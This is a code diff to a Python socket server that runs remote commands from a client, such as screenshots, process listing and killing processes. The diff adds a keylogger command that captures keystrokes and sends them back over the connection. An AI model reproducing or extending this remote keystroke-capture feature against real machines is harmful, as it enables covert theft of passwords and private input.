@@ -4,6 +4,7 @@ import threading
 import time
 from ScreenShot import*
 from RunningProccess import*
+from KeyLogger import*
 
 HEADER = 64
 PORT = 5050
@@ -16,7 +17,8 @@ TAKE_SCREEN_SHOT = "TAKE SCREENSHOT"
 RUNNING_PROCESS ="CHECK RUNNING PROCESS"
 STOP_LISTING = "STOP LISTING"
 KILL_PROCESS_VIA_PID = "KILL PROCESS VIA PID"
-KILL_PROCESS_VIA_PID_V2 = "KILL PROCESS VIA PID V2"
+KILL_PROCESS_VIA_NAME = "KILL PROCESS VIA NAME"
+KEY_LOGGING ="KEY LOG"
 
 
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -67,24 +69,24 @@ def handle_client(conn, addr):
                 else:
                     reply += f"PROCESS ID: {pid} NOT FOUND"
 
-            elif msg == KILL_PROCESS_VIA_PID_V2:
-                conn.send("Deleting process with PID: ".encode(FORMAT))
-                pid = conn.recv(1024).decode(FORMAT)
-                pid = int(pid)
-                f=wmi.WMI()
-                cnt = 0
-                
-                for process in f.Win32_Process():
-                    if process.ProcessId == pid:
-                        process.Terminate()
-                        cnt+= 1 
-                if cnt == 0:
-                    reply += f"PROCESS ID: {pid} NOT FOUND"
-                else:
-                    reply += f"PROCESS ID: {pid} TERMINATED"
+            
 
-               
-                
+            elif msg == KILL_PROCESS_VIA_NAME:
+                conn.send("Deleting process with process's name: ".encode(FORMAT))
+                p_name = conn.recv(1024).decode(FORMAT)
+                process_killed = kill_process_by_name(p_name)
+                if process_killed == True:
+                    reply += f"{p_name} TERMINATED"
+                else:
+                    reply += f"{p_name} NOT FOUND"
+
+            
+            elif msg == KEY_LOGGING:
+                conn.send("Key Logger is active ... ".encode(FORMAT))
+                key_log_string = Key_Log()
+                #print(key_log_string)
+                conn.send(key_log_string.encode(FORMAT))
+                reply += "KEYLOG FINISH"
 
 
             elif msg == DISCONNECT_MESSAGE:
